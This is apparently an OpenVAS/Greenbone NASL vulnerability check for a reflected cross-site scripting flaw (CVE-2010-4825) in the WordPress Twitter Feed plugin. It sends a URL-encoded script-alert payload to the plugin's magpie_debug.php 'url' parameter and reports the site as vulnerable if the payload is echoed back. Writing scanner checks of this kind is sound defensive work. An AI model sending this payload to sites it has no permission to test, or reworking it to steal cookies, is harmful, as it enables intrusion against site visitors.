if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100944" );
	script_version( "2020-05-14T13:01:46+0000" );
	script_tag( name: "last_modification", value: "2020-05-14 13:01:46 +0000 (Thu, 14 May 2020)" );
	script_tag( name: "creation_date", value: "2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)" );
	script_bugtraq_id( 45294 );
	script_cve_id( "CVE-2010-4825" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress Twitter Feed Plugin 'url' Parameter Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45294" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/WordPress.Twitter.Feed.0.3.1.Reflected.Cross-site.Scripting/68" );
	script_tag( name: "summary", value: "The Twitter Feed Plugin for WordPress is prone to a cross-site
  scripting vulnerability because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker
  to steal cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "Twitter Feed 0.3.1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "Remove Older version of Twitter Feed Plugin and Install Twitter Feed
  plugin version 1.0 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
cpe_list = make_list( "cpe:/a:wordpress:wordpress",
	 "cpe:/a:wordpress:wordpress_mu" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list, service: "www" )){
	exit( 0 );
}
cpe = infos["cpe"];
port = infos["port"];
if(!dir = get_app_location( cpe: cpe, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/wp-content/plugins/wp-twitter-feed/magpie/scripts/magpie_debug.php?url=%3cscript%3ealert('vt-xss-test')%3c%2fscript%3e" );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\('vt-xss-test'\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( url: url, port: port );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

